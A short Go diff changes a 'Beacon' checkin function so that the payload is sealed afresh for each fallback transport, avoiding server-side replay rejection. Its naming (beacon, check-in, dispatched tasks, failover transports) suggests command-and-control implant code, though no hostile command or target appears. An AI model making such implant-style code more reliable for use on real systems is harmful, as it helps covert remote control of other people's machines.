@@ -150,12 +150,16 @@ func (b *Beacon) Run() {
 
 // checkin pushes the payload and runs any dispatched tasks.
 func (b *Beacon) checkin(sess *mcrypto.Session, payload []byte) error {
-	env, err := sess.Seal(payload)
-	if err != nil {
-		return err
-	}
 	var lastErr error
 	for _, t := range b.transports {
+		// Seal fresh per transport: each envelope carries a random nonce and
+		// the server rejects repeats as replays, so reusing one envelope
+		// across transports would fail over to the second transport with a
+		// replay error instead of a delivery.
+		env, err := sess.Seal(payload)
+		if err != nil {
+			return err
+		}
 		replyEnv, err := t.Checkin(sess.SessionID, env)
 		if err != nil {
 			lastErr = err
